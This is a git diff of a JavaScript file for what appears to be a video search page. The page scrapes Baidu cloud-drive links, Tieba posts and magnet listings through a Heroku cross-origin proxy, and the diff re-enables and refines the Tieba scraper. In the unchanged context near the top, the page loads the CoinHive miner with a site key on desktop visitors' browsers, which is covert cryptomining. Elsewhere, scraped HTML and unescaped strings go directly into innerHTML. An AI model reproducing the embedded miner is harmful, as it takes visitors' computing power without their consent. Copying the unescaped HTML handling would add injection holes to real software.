@@ -72,7 +72,7 @@ function locationParameterChanged() {
     window.panc=pancFetcher(key);
     window.panduoduo=panduoduoFetcher(key);
     window.magnet=magnetFetcher(key);
-//     window.tieba=tiebaFetcher(key);
+    window.tieba=tiebaFetcher(key);
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
@@ -117,7 +117,9 @@ function confirm(id,isImportant,data){
 function ShowMore(){
 
     var length = window.showVideos.length;
-    var ways = [panc,panduoduo,magnet];
+    var ways = [panc,panduoduo,tieba,magnet];
+
+//     var ways = [panduoduo];
     if(length<1){
         length = 1;
     }
@@ -192,9 +194,9 @@ function panduoduoFetcher(key){
 
             var as = el.querySelectorAll(select);
             for(var i = 0;i<as.length;i++){
-    //             if(i>10){
-    //                 break;
-    //             }
+                if(videos.length>10){
+                    break;
+                }
                 var img = as[i].querySelector('[title="百度云盘资源"]');
                 var type = as[i].querySelector('[href^="/c/"]');
                 if(img&&type.innerHTML=="视频"){
@@ -234,9 +236,10 @@ function panduoduoFetcher(key){
                 }
                 video["url"] = url;
                 function parseDetail(html,select){
-                    var href = html.substring(html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length,html.indexOf('" rel="nofollow">点击去百度云盘下载资源</a>'));
-                    var url = getURLParameter("url",href);
-                    return url;
+                    var urlIndex = html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;
+                    var href = html.substring(urlIndex,html.indexOf('"',urlIndex));
+//                     var url = getURLParameter("url",href);
+                    return href;
                 }
 
                 setIframeUrl(url,wrapper,isSrc);
@@ -326,6 +329,8 @@ function nodeFetch(host,api,success){
 function cross(host,api,success){
 
 //     confirm("loadingTemplate");
+//     var url = encodeURI("http://127.0.0.1:8888/cross?api="+api);
+
     var url = encodeURI("//charon-node.herokuapp.com/cross?api="+api);
     try{
         var error = function(){
@@ -357,8 +362,9 @@ function setIframe(videos,isSrc,waitUrl,templateId) {
         wrapper.innerHTML= template;
         a = wrapper.children[0];
         a.innerHTML=videos[i].name;
+        var url = videos[i].url;
+        a.href=videos[i].refUrl||url;
         if(!waitUrl){
-            var url = videos[i].url;
             setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
         
         }
@@ -371,15 +377,17 @@ function setIframe(videos,isSrc,waitUrl,templateId) {
     return wrapper;
 }
 function setIframeUrl(url,wrapper,isSrc,templateId){
-    a.href=url;
     var iframe = wrapper.querySelector("iframe");
 
     templateId = templateId?templateId:"videoTemplate";
+    if(!url){
+        wrapper.removeChild(iframe);
+        return;
+    }
     if(templateId=="videoTemplate"){
         if(isDisableScript(url)){
             iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock";
         }
-
         url = url.substr(url.indexOf("//"));
         iframe.dataset.src=url;
         if(isSrc){
@@ -641,7 +649,7 @@ function progress(id){
 function innerProgress(host,fetchUrl){
     var progressGroup = document.getElementById("progressGroup");
     progressGroup.classList.add("show");
-    var html = '<li class="'+host+'"><progress max="20000" id="'+host+'Progress"></progress><a target="_blank" href="'+fetchUrl+'">'+host+'</a>';
+    var html = '<li class="'+host+'"><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><progress max="20000" id="'+host+'Progress"></progress><span>'+host+'<span></a>';
     appendHTML(progressGroup,html)
     return progress(host+'Progress');
 }
@@ -662,6 +670,7 @@ function appendHTML(d,html){
 //     })
 // }
 function checkInvalid(url,error){
+
     var uri = "//charon-node.herokuapp.com/cross?api="+url;
     ajax(uri,function(data){
         var el = document.createElement( 'html' );
@@ -675,11 +684,23 @@ function checkInvalid(url,error){
     },error);
 }
 function clearInvalid(array,c){
-    array.map(function(o) { 
-        checkInvalid(o["url"],function(){
-            array.splice(array.indexOf(o), 1);
-        })
-    });
+    try{
+        array.map(function(o) { 
+    
+            var isSortUrl =function(url){
+                var index = url.indexOf("pan.baidu.com/s/");
+                return index>=0?true:false;
+            }
+            if(!isSortUrl(o["url"])){
+                checkInvalid(o["url"],function(){
+                    array.splice(array.indexOf(o), 1);
+                })
+            }
+        });
+    }catch(e){
+
+    }
+    
 
 }
 
@@ -723,11 +744,11 @@ function setDoubanWeekly(value){
         for(var i = 0;i<subjects.length;i++){
             var subject = subjects[i].subject;
             var isSame = "";
-            var original_title = sort(subject.original_title);
-            if(value&&value==subject.original_title){
+            var title = sort(subject.title);
+            if(value&&value==title){
                 isSame = 'class="is-same"';
             }
-            html += '<a '+isSame+' href="?search='+encodeURIComponent(original_title)+'"><img src="'+subject.images.medium+'"/><span>'+original_title+'<span></a>'
+            html += '<a '+isSame+' href="?search='+encodeURIComponent(title)+'"><img src="'+subject.images.medium+'"/><span>'+title+'<span></a>'
 
         }
         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more">Top 250<i>﹀</i></a>';
@@ -762,6 +783,7 @@ function tiebaFetcher(key){
 
     parameter.parseVideos = function(html){
         var videos = parseHref(html,".s_post");
+        
         clearInvalid(videos);
         return videos;
 
@@ -771,22 +793,52 @@ function tiebaFetcher(key){
             el.innerHTML = html;
             var as = el.querySelectorAll(select);
             for(var i = 0;i<as.length;i++){
+                var p_title = as[i].querySelector(".p_title").innerHTML;
+                var refUrlIndex = p_title.indexOf('href="')+6;
+                var refUrlEnd = p_title.indexOf('"',refUrlIndex);
+                var refUrl = p_title.substring(refUrlIndex,refUrlEnd)
+                var html = p_title+as[i].querySelector(".p_content").innerHTML;
+                
+                var key = getkey(html);
                 var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
                 var keyIndex = string.lastIndexOf(key);
                 var name = string.slice(keyIndex);
-                var urlIndex = string.indexOf("http",keyIndex);
-                if(urlIndex>0){
-                    var url = string.slice(urlIndex);
-                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
-                    var match = url.match(regexp);
-                    url = url.slice(0,match.index);
-                }
+                var url = getUrl(string,keyIndex);
+                
                 if(url){
-                    videos.push({name:name,url:url});
+                    videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl});
                 }
 
             }
             return videos;
+
+            function getUrl(string,keyIndex){
+                var keyIndex2 = keyIndex?keyIndex:0;
+                var urlIndex = string.indexOf("http",keyIndex2);
+                if(urlIndex>=0){
+                    var url = string.slice(urlIndex);
+                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
+                    var match = url.match(regexp);
+                    url = url.slice(0,match.index);
+                    return url;
+                }else{
+                    if(keyIndex){
+                        return getUrl(string);
+                    }
+                }
+                return "";
+            }
+            function getkey(html){
+                var wrapper= document.createElement('div');
+                wrapper.innerHTML= html;
+                var ems = wrapper.querySelectorAll("em");
+                for(var i = ems.length-1;i>=0;i--){
+                    if(ems[i].innerText!="pan.baidu"){
+                        return ems[i].innerText;
+                    }
+                }
+                return "";
+            }
         }
     }
     parameter.setIframe = function (videos,length,showVideos){
